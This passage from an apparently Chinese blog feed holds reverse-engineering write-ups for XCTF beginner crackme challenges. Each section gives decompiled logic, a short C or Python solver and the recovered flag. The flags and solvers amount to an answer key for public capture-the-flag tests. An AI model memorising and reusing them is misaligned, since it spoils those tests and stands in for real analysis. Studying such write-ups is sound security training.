class="keyword">char</span> cmps[<span class="number">30</span>]=&#123;<span class="number">0x6E</span>,<span class="number">0x10</span>,<span class="number">0xEC</span>,<span class="number">0x13</span>,<span class="number">0xC1</span>,<span class="number">0xCB</span>,<span class="number">0xF0</span>,<span class="number">0x2D</span>,<span class="number">0xC6</span>,<span class="number">0x32</span>,<span class="number">0xFD</span>,<span class="number">0x86</span>,<span class="number">0xEE</span>,<span class="number">0xCB</span>,<span class="number">0x89</span>,<span class="number">0x92</span>,<span class="number">0x3C</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x71</span>,<span class="number">0x62</span>,<span class="number">0x57</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">22</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">cmps[i]=(cmps[i]&lt;&lt;<span class="number">3</span>)|(cmps[i]&gt;&gt;<span class="number">5</span>);</span><br><span class="line">cmps[i]-=((keys[i%<span class="number">6</span>]&gt;&gt;<span class="number">6</span>)^(keys[(i<span class="number">-1</span>)%<span class="number">6</span>]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xFE</span>);</span><br><span class="line">cmps[i]=(cmps[i]^i)-i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,cmps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/22/NPUCTF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>xctf新手区</title>
      <link>https://usher2008.github.io/2020/04/15/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/</link>
      <guid>https://usher2008.github.io/2020/04/15/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/</guid>
      <pubDate>Wed, 15 Apr 2020 10:57:58 GMT</pubDate>
      <description>
      
        &lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt; hello,ctf
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a> hello,ctf<a id="more"></a></h1><p><s>这个就是明文,丢进OD/IDA/x64dbg搜索字符串即可</s></p><p>抱歉抱歉,丢进去一看不是这么回事,找到scanf,输入假码跟踪发现是把输入的字符串的ascll码形式转换成字符串再与key比较,那咱把字符串变成ascii码输出就好了嘛</p><p>丢进IDA内部分分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v4 = input[i];</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">break</span>;                                  <span class="comment">// 这里学习一下sprintf,</span></span><br><span class="line">                                            <span class="comment">// char a[6],b[]="hello";</span></span><br><span class="line">                                            <span class="comment">// sprintf(a,"%s",b);</span></span><br><span class="line">                                            <span class="comment">// 这个时候a="hello"</span></span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;v8, per_x, v4);                  <span class="comment">// %x</span></span><br><span class="line">  <span class="built_in">strcat</span>(&amp;v10, &amp;v8);                        <span class="comment">// v8为input[i]的hex 接在v10屁股上 v10初始是空的</span></span><br><span class="line">  ++i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp其实并不好写…..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"437261636b4d654a757374466f7246756e"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">17</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;key[i];i+=<span class="number">2</span>)</span><br><span class="line">flag[j++] = ((key[i]-<span class="string">'0'</span>)&lt;&lt;<span class="number">4</span>) + (key[i+<span class="number">1</span>]-(key[i+<span class="number">1</span>]&lt;=<span class="string">'9'</span>?<span class="string">'0'</span>:<span class="number">87</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p> flag:CrackMeJustForFun</p></blockquote><hr><h1 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h1><p>这题直接给出了源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br></pre></td></tr></table></figure><p>从末尾可以看出flag是hash的十六进制,只要求出hash就可以了,上面的关键代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">first == <span class="number">0xcafe</span></span><br><span class="line">second % <span class="number">5</span> != <span class="number">3</span> &amp;&amp; second % <span class="number">17</span> == <span class="number">8</span></span><br><span class="line"><span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>手写exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x"</span>,<span class="number">0xcafe</span>*<span class="number">31337</span>+<span class="number">88</span>+<span class="number">7</span><span class="number">-1615810207</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:c0ffee</p></blockquote><hr><h1 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h1><p>这个题emm第一次碰见elf的加壳文件,嗯,不会,直接看wp</p><p><img src="https://ae01.alicdn.com/kf/Hb293a9a11f5f4c10888f3bee29fb2672I.png" alt=""></p><p>ok脱壳成功,之后把脱壳完毕的文件丢进IDA,flag就出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     esi, offset flag ; &quot;flag&#123;Upx_1s_n0t_a_d3liv3r_c0mp4ny&#125;&quot;</span><br><span class="line">mov     rdi, rax        ; s1</span><br><span class="line">call    _strcmp</span><br></pre></td></tr></table></figure><hr><h1 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( input[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ key[i]) )</span><br></pre></td></tr></table></figure><p>关键代码就这一句</p><p>exp也很简单啦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">":\"AL_RT^L*.?+6/46"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(key);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> temp=<span class="number">0x65626D61726168</span>LL;</span><br><span class="line">flag[i] = *((<span class="keyword">char</span>*)&amp;temp + i % <span class="number">7</span>) ^ key[i];</span><br><span class="line">&#125;<span class="comment">//先取temp地址再看作数组再+i%7这个地址的值^key</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:RC3-2016-XORISGUD</p></blockquote><hr><h1 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h1><p>这个题的逻辑很简单,就是掷骰子,有几句话,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Reticulating splines, please wait.."</span>);</span><br><span class="line">sleep(<span class="number">5u</span>);</span><br><span class="line">v3 = time(<span class="number">0</span>);</span><br><span class="line">srand(v3);</span><br><span class="line">v4 = rand();</span><br><span class="line"><span class="built_in">puts</span>((&amp;strs)[v4 % <span class="number">0xA</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">strs            dd offset a9447ThisIsAFla</span><br><span class="line">.data:080499C0                                         ; DATA XREF: main+4D↑r</span><br><span class="line">.data:080499C0                                         ; &quot;9447&#123;This_is_a_flag&#125;&quot;</span><br><span class="line">.data:080499C4                 dd offset aCongratsYouHac ; &quot;Congrats, you hacked me!\n$ &quot;</span><br><span class="line">.data:080499C8                 dd offset aRmRfPermission ; &quot;rm -rf &#x2F; : Permission denied&quot;</span><br><span class="line">.data:080499CC                 dd offset aDefineYouMassi ; &quot;#define YOU \&quot;massive failure\&quot;&quot;</span><br><span class="line">.data:080499D0                 dd offset aIfYouRePretend ; &quot;If you&#39;re pretending to suck, you just &quot;...</span><br><span class="line">.data:080499D4                 dd offset aThereArenTEnou ; &quot;There aren&#39;t enough bits in my memory t&quot;...</span><br><span class="line">.data:080499D8                 dd offset aYourAbilityToH ; &quot;Your ability to hack is about as good a&quot;...</span><br><span class="line">.data:080499DC                 dd offset aHaveYouConside ; &quot;Have you considered becoming a vacuum c&quot;...</span><br><span class="line">.data:080499E0                 dd offset aIVeGotAGoodFee ; &quot;I&#39;ve got a good feeling about this one.&quot;...</span><br><span class="line">.data:080499E4                 dd offset aKnockKnockWhoS ; &quot;Knock knock..\nWho&#39;s there?\nUDP.\nUDP &quot;...</span><br></pre></td></tr></table></figure><hr><h1 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h1><p>附件是个pyc文件就是py编译的文件,百度在线python反编译,把附件载入之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64<span class="comment">#这句是导入库,就像#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span><span class="comment">#定义encode函数</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span><span class="comment">#ord以一个字符作为参数,返回这个字符的ascll</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)<span class="comment">#chr以一个0~255的整数作参数,返回一个对应的字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)<span class="comment">#最后将这个字符串base64加密</span></span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()<span class="comment">#输入到flag</span></span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:<span class="comment">#如果flag解密与correct相等就正确</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>上面的分析是我写的啦,不是反编译出来的嘞</p><p>先百度base64在线解密,把correct输入后得到<strong>^SdVkT#S ]`Y!^)ism</strong></p><p>oshit,解出来的字符不能输入,那只能自己写一个base64解密了,就当锻炼一波写代码能力</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"XlNkVmtUI1MgXWBZXCFeKY+AaXNt"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">decode(key);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(key);i++)</span><br><span class="line">flag[i] = (key[i]<span class="number">-16</span>) ^ <span class="number">32</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">char</span>* tempt=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(temp);</span><br><span class="line"><span class="keyword">char</span> table[<span class="number">64</span>]=&#123;<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,</span><br><span class="line"><span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,</span><br><span class="line"><span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,</span><br><span class="line"><span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,</span><br><span class="line"><span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,</span><br><span class="line"><span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,</span><br><span class="line"><span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,</span><br><span class="line"><span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'+'</span>,<span class="string">'/'</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(tempt,<span class="number">0</span>,temp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">64</span>;j++)</span><br><span class="line"><span class="keyword">if</span>(str[i]==table[j])</span><br><span class="line">&#123;</span><br><span class="line">str[i]=j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;temp;i+=<span class="number">4</span>,j+=<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">tempt[j]=((str[i]&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>)+((str[i+<span class="number">1</span>]&amp;<span class="number">0x30</span>)&gt;&gt;<span class="number">4</span>);</span><br><span class="line">tempt[j+<span class="number">1</span>]=((str[i+<span class="number">1</span>]&amp;<span class="number">0xF</span>)&lt;&lt;<span class="number">4</span>)+((str[i+<span class="number">2</span>]&amp;<span class="number">0x3C</span>)&gt;&gt;<span class="number">2</span>);</span><br><span class="line">tempt[j+<span class="number">2</span>]=((str[i+<span class="number">2</span>]&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">6</span>)+(str[i+<span class="number">3</span>]&amp;<span class="number">0x3F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcpy</span>(str,tempt);</span><br><span class="line"><span class="built_in">free</span>(tempt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:nctf{d3c0mpil1n9_PyC}</p></blockquote><hr><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>这个题字符串看见了这一句</p><blockquote><p>.rdata:0050B0F0    00000015    C    done!!! the flag is </p></blockquote><p>这后面是一个给了一大串字符然后进行加密,咱懒得写了,一路交叉引用上去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">     &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_457AB4();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>好,安排</p><p><img src="https://i.loli.net/2020/04/08/wqaD7zsfgo8NUSB.png" alt=""></p><p><img src="https://i.loli.net/2020/04/08/NQcWbnGZKo46SfH.png" alt=""></p><p><img src="https://i.loli.net/2020/04/08/ilVQTHJhmyAk3bq.png" alt=""></p><p>就是这么愉快的拿到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">*(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br></pre></td></tr></table></figure><p>回头看了下他的算法,就是两个数组异或异或异或…</p><hr><h1 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h1><p>f5看main逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )<span class="comment">//s=c61b68366edeb7bdce3c6820314b7498</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">      v3 = <span class="number">1</span>;<span class="comment">//i为奇数时</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1</span>;<span class="comment">//为偶时</span></span><br><span class="line">    *(&amp;t + i + <span class="number">10</span>) = s[i] + v3;<span class="comment">//其实就是+1-1</span></span><br><span class="line">  &#125;<span class="comment">// 解密</span></span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">"/tmp/flag.txt"</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">"w"</span>);<span class="comment">// 放入flag.txt</span></span><br><span class="line">  <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u);<span class="comment">//u=*******************************************</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(&amp;t); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(stream, p[j], <span class="number">0</span>);<span class="comment">//函数设置文件指针stream的位置</span></span><br><span class="line">    fputc(*(&amp;t + p[j]), stream);<span class="comment">//将字符ch写到文件指针fp所指向的文件的当前写指针的位置</span></span><br><span class="line">    fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u);</span><br><span class="line">  &#125;<span class="comment">//这里是把flag的某一位写进flag.txt,然后又用***替换掉</span></span><br><span class="line"><span class="comment">//值得一提的是fputc和fprintf并不会实时更新文本,而fseek会更新文本</span></span><br></pre></td></tr></table></figure><p>那么我们根本不需要去解密,直接在他解密完之后去t拿就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000006010E0 t db &#39;S&#39;                                ; DATA XREF: main+65↑w</span><br><span class="line">.data:00000000006010E0                                         ; main+C9↑o ...</span><br><span class="line">.data:00000000006010E1 aHarifctf db &#39;harifCTF&#123;b70c59275fcfa8aebf2d5911223c6589&#125;&#39;,0</span><br></pre></td></tr></table></figure><hr><h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p><img src="https://i.loli.net/2020/04/08/u16x4GOyKS587NZ.png" alt=""></p><p>这个题目直接明文,不过ida里面搜不到呢…</p><p><img src="https://i.loli.net/2020/04/08/U1fEu352stPlxV7.png" alt=""></p><p>ida里面按R转换一下字符串也可以看见不过要自己倒过来,挺麻烦的</p><hr><h1 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h1><p>直接盗取他的革命成果…</p><p><img src="https://i.loli.net/2020/04/08/Hbm3ZARJgs9x8re.png" alt=""></p><p>不过还是来分析一波decrypt</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span> &amp;&amp; v4 &lt; v6; ++i )</span><br><span class="line">dest[v4++] -= a2[i];</span><br><span class="line"><span class="comment">//a2=0x1401,0x1402,0x1403,0x1404,0x1405</span></span><br><span class="line"><span class="comment">//dest=0x143A,0x1436,0x1437,0x143B,0x1480,0x147A,0x1471,0x1478,0x1463,0x1466,0x1473,0x1467,0x1462,0x1465,0x1473,0x1460,0x146B,0x1471,0x1478,0x146A,0x1473,0x1470,0x1464,0x1478,0x146E,0x1470,0x1470,0x1464,0x1470,0x1464,0x146E,0x147B,0x1476,0x1478,0x146A,0x1473,0x147B,0x1480,0x0</span></span><br></pre></td></tr></table></figure><p>太棒了,又学到了新东西(哭丧脸</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">wchar_t</span> a[]=&#123;<span class="number">0x1401</span>,<span class="number">0x1402</span>,<span class="number">0x1403</span>,<span class="number">0x1404</span>,<span class="number">0x1405</span>&#125;;</span><br><span class="line"><span class="keyword">wchar_t</span> dest[]=&#123;<span class="number">0x143A</span>,<span class="number">0x1436</span>,<span class="number">0x1437</span>,<span class="number">0x143B</span>,<span class="number">0x1480</span>,<span class="number">0x147A</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x1463</span>,<span class="number">0x1466</span>,<span class="number">0x1473</span>,<span class="number">0x1467</span>,<span class="number">0x1462</span>,<span class="number">0x1465</span>,<span class="number">0x1473</span>,<span class="number">0x1460</span>,<span class="number">0x146B</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1478</span>,<span 